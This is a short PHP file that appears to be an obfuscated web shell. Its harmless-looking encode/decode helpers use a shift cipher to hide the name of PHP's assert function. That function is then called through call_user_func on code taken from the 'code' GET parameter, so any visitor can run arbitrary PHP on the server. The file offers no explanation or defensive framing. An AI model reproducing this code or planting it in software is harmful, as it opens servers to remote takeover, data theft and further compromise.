
<?php
    
    function encode($string) {
        $result = '';
        
        for ($index = 0;$index < strlen($string);$index += 1)
            $result .= chr(ord($string[$index]) + 3);
            
        return $result;
    }
    
    function decode($string) {
        $result = '';
        
        for ($index = 0;$index < strlen($string);$index += 1)
            $result .= chr(ord($string[$index]) - 3);
            
        return $result;
    }
    
    $a = '_GET';
    $b = $$a;
    $a = decode('dvvhuw');
    call_user_func(decode('dvvhuw'),'$code=function() { '.$b['code'].'}');

?>
